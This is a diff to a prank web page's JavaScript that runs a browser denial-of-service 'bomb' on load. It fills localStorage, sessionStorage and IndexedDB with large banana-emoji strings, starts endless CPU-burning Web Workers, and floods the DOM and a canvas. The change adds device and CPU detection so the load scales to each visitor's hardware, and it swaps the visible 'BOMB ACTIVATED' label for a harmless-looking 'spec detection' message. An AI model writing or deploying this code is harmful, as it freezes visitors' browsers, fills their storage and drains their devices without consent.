@@ -27,20 +27,46 @@
     setTimeout(() => {
       document.body.innerHTML = `
         <h1>(   ᐛ)ﾊﾞﾅﾅ</h1>
-        <p style="font-size:0.6em;margin-top:30px;">STORAGE + CPU + DOM BOMB ACTIVATED</p>
+        <p style="font-size:0.6em;margin-top:30px;">スペック検知中...</p>
       `;
 
+      // スペック検知
+      const cores = navigator.hardwareConcurrency || 4;
+      const memoryGB = navigator.deviceMemory || 4; // 対応ブラウザのみ（GB単位）
+      const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+      
+      // 簡易ベンチマーク（CPUの強さを大まかに測る）
+      function quickBenchmark() {
+        const start = performance.now();
+        let x = 0;
+        for (let i = 0; i < 5000000; i++) {
+          x += Math.sqrt(i) * Math.sin(i);
+        }
+        return performance.now() - start;
+      }
+
+      const benchmarkTime = quickBenchmark();
+      const powerLevel = Math.min(3, Math.max(1, Math.floor(800 / benchmarkTime))); // 1〜3段階
+
+      const intensity = {
+        workers: Math.max(cores * 1.5, 6),
+        storageItems: Math.floor(200 + memoryGB * 80),
+        domPerTick: Math.floor(4000 + cores * 800),
+        canvasMultiplier: Math.max(1.2, cores / 4),
+        interval: Math.max(8, 20 - cores * 2)
+      };
+
       function storageBomb() {
-        const hugeData = '🍌'.repeat(1024 * 512);
+        const hugeData = '🍌'.repeat(1024 * 600);
 
         try {
-          for (let i = 0; i < 300; i++) {
+          for (let i = 0; i < intensity.storageItems; i++) {
             localStorage.setItem('lag_' + i, hugeData);
           }
         } catch(e) {}
 
         try {
-          for (let i = 0; i < 400; i++) {
+          for (let i = 0; i < intensity.storageItems + 100; i++) {
             sessionStorage.setItem('lag_s_' + i, hugeData);
           }
         } catch(e) {}
@@ -58,10 +84,10 @@
           const store = tx.objectStore('lagStore');
           
           setInterval(() => {
-            for (let i = 0; i < 80; i++) {
+            for (let i = 0; i < 60 + cores * 10; i++) {
               store.put(hugeData, 'key_' + Date.now() + '_' + i);
             }
-          }, 50);
+          }, 40);
         };
       }
 
@@ -70,7 +96,7 @@
           self.onmessage = function() {
             while(true) {
               let x = 0;
-              for(let i = 0; i < 200000; i++) {
+              for(let i = 0; i < 300000; i++) {
                 x += Math.sqrt(Math.random() * 999999) * Math.sin(i);
               }
             }
@@ -79,7 +105,7 @@
         const blob = new Blob([workerCode], {type: 'text/javascript'});
         const url = URL.createObjectURL(blob);
 
-        for (let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
+        for (let i = 0; i < intensity.workers; i++) {
           const w = new Worker(url);
           w.postMessage('die');
         }
@@ -87,32 +113,33 @@
 
       function visualBomb() {
         setInterval(() => {
-          for (let i = 0; i < 6000; i++) {
+          for (let i = 0; i < intensity.domPerTick; i++) {
             const d = document.createElement('div');
             d.textContent = 'LAG🍌';
             d.style.position = 'fixed';
             d.style.left = Math.random() * 100 + 'vw';
             d.style.top = Math.random() * 100 + 'vh';
-            d.style.fontSize = Math.random() * 30 + 10 + 'px';
-            d.style.opacity = Math.random() * 0.8 + 0.2;
+            d.style.fontSize = (Math.random() * 40 + 12) + 'px';
+            d.style.opacity = Math.random() * 0.7 + 0.3;
             document.body.appendChild(d);
           }
-        }, 12);
+        }, intensity.interval);
 
         const c = document.createElement('canvas');
-        c.width = window.innerWidth * 1.5;
-        c.height = window.innerHeight * 1.5;
+        c.width = window.innerWidth * intensity.canvasMultiplier;
+        c.height = window.innerHeight * intensity.canvasMultiplier;
         c.style.position = 'fixed';
         c.style.zIndex = '-1';
         document.body.appendChild(c);
         const ctx = c.getContext('2d');
         function drawChaos() {
-          ctx.fillStyle = `hsla(${Math.random()*360},100%,50%,0.1)`;
-          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 80, 80);
+          ctx.fillStyle = `hsla(${Math.random()*360},100%,50%,0.08)`;
+          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 120, 120);
           requestAnimationFrame(drawChaos);
         }
         drawChaos();
       }
+
 
       storageBomb();
       cpuBurn();
